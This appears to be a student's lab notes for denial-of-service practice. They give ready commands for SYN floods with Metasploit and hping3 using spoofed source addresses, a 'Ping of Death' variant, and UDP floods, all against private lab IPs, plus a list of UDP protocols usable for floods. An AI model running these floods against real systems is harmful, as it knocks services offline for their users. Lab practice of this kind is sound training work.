<h1>DoS / DDoS practice</h1>

  <h2>DoS with Metasploit</h2>
<p>SYN flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. 
  This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system. The process of transmitting such packets is 
  faster than the system can handle. Normally, the connection establishes with the TCP three-way handshake, and the host keeps track of the partially 
  open connections while waiting in a listening queue for response ACK packets.</p>

<p>Metasploit is a penetration testing platform that allows a user to find, exploit, and validate vulnerabilities. Also, it provides the infrastructure, 
  content, and tools to conduct penetration tests and comprehensive security auditing. The Metasploit framework has numerous auxiliary module scripts that 
  can be used to perform DoS attacks.</p>

<p>Here, we will use the Metasploit tool to perform a DoS attack (SYN flooding) on a target host.</p>
  <p><ol>
    <ul>First, check if port 21 is open on the victim pc</ul>
    <ul>nmap -p 21 10.10.1.11</ul>
    <ul>msfconsole</ul>
    <ul>use auxiliary/dos/tcp/synflood</ul>
    <ul>set RHOST 10.10.1.11</ul>
    <ul>set RPORT 21</ul>
    <ul>set SHOSTS (spoofable IP) 10.10.1.19</ul>
    <ul>exploit -> Enter</ul>
    <ul>use Wireshark on the victim PC to check what's going on</ul>
  </ol></p>

  <h2>DoS with hping3</h2>
  <p>Here, we will use the hping3 tool to perform DoS attacks such as SYN flooding, Ping of Death (PoD) attacks, and 
    UDP application layer flood attacks on a target host.</p>

  <p><ol>
    <ul>hping3 -S 10.10.1.11 -a (spoofable IP) 10.10.1.19 -p 22 --flood</ul>
    <ul>use Wireshark on the victim PC to check what's going on</ul>
    <ul>observe the graphical view of the captured packets using Statistics from the Wireshark menu bar</ul>
    <ul>click the I/O Graph option from the drop-down list</ul>
  </ol></p>

  <h2>Ping of Deatch (PoD) with hping3</h2>
  <p><ol>
    <ul>hping3 -d 65538 -S -p 21 --flood 10.10.1.11</ul>
    <ul>we send a packet that has a size of 65,538 bytes to the target web server</ul>
    <ul>This packet size exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes</ul>
    <ul>The receiving system’s reassembly process might cause the system to crash</ul>
    <ul>use Wireshark on the victim PC to check what's going on</ul>
  </ol></p>

    <h2>UDP application layer flood attack with hping3</h2>
  <p><ol>
    <ul>nmap -p 139 10.10.1.19</ul>
    <ul>we will use NetBIOS port 139 to perform a UDP application layer flood attack</ul>
    <ul>hping3 -2 -p 139 --flood 10.10.1.19</ul>
    <ul>-2: specifies the UDP mode; -p: specifies the destination port; and --flood: sends a huge number of packets</ul>
    <ul>use Wireshark on the victim PC to check what's going on</ul>
    <ul>you can employ other application layer protocols to perform a UDP application layer flood attack on a target network</ul>
    <ul>CharGEN (Port 19); SNMPv2 (Port 161); QOTD (Port 17); RPC (Port 135); SSDP (Port 1900); CLDAP (Port 389); TFTP (Port 69); 
NetBIOS (Port 137,138,139); NTP (Port 123); Quake Network Protocol (Port 26000); VoIP (Port 5060)</ul>
  </ol></p>
